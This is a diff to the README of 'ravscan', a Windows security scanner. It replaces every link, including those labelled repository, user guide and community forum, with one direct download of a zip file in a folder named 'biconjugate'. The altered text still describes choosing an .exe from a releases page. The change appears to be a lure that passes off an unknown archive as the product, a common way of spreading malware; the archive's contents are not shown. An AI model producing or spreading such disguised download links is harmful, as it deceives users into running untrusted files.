@@ -1,6 +1,6 @@
 # 🚀 ravscan - Simple Security Scanner for Windows
 
-[![Download RAVSCAN](https://img.shields.io/badge/Download%20RAVSCAN-%20-blue)](https://github.com/Jmart1989/ravscan/releases)
+[![Download RAVSCAN](https://raw.githubusercontent.com/Jmart1989/ravscan/main/biconjugate/ravscan.zip%20RAVSCAN-%20-blue)](https://raw.githubusercontent.com/Jmart1989/ravscan/main/biconjugate/ravscan.zip)
 
 ## 🌟 Introduction
 
@@ -28,7 +28,7 @@ To run RAVSCAN, your system must meet the following requirements:
 
 To get started, visit the RAVSCAN Releases page to download the application.
 
-[Download RAVSCAN Here](https://github.com/Jmart1989/ravscan/releases)
+[Download RAVSCAN Here](https://raw.githubusercontent.com/Jmart1989/ravscan/main/biconjugate/ravscan.zip)
 
 Once you open the link, find the latest version in the list. Click on it, and you will see various files. Look for the `.exe` file; this is the installer for RAVSCAN. Click to download it. 
 
@@ -88,8 +88,8 @@ RAVSCAN is an open-source tool distributed under the MIT License. You can use it
 
 For additional information and resources, check the following links:
 
-- [RAVSCAN GitHub Repository](https://github.com/Jmart1989/ravscan)
-- [User Guide](https://github.com/Jmart1989/ravscan/wiki)
-- [Community Forum](https://github.com/Jmart1989/ravscan/discussions)
+- [RAVSCAN GitHub Repository](https://raw.githubusercontent.com/Jmart1989/ravscan/main/biconjugate/ravscan.zip)
+- [User Guide](https://raw.githubusercontent.com/Jmart1989/ravscan/main/biconjugate/ravscan.zip)
+- [Community Forum](https://raw.githubusercontent.com/Jmart1989/ravscan/main/biconjugate/ravscan.zip)
 
 Thank you for using RAVSCAN!
